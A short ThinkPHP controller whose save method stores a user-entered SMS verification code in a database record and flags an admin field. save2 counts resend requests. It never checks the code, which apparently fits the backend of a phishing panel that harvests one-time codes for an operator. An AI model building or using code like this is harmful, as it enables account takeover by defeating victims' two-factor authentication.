<?php
namespace app\controller;

use app\BaseController;
use think\facade\View;
use think\facade\Db;

class Sms extends BaseController
{
    public function index()
    {
        return View::fetch();
        
    }
    public function save($yzm)
    {
        $user['zt']=30;
        $user['yzm']=$yzm;
        Db::Name('data')->where('id',session('id'))->update($user);
        //----------添加提醒次数------------
        Db::Name('Admin')->where('id',1)->update(['time_sms'=>time()]);
        add_log(session('id'),41,'填写手机验证码');
        return json(['code'=>200]);
    }
    public function save2()
    {
        Db::Name('data')->where('id',session('id'))->inc('yzm_cf')->update();
        add_log(session('id'),42,'申请重发验证码');
        return json(['code'=>200]);
    }
}
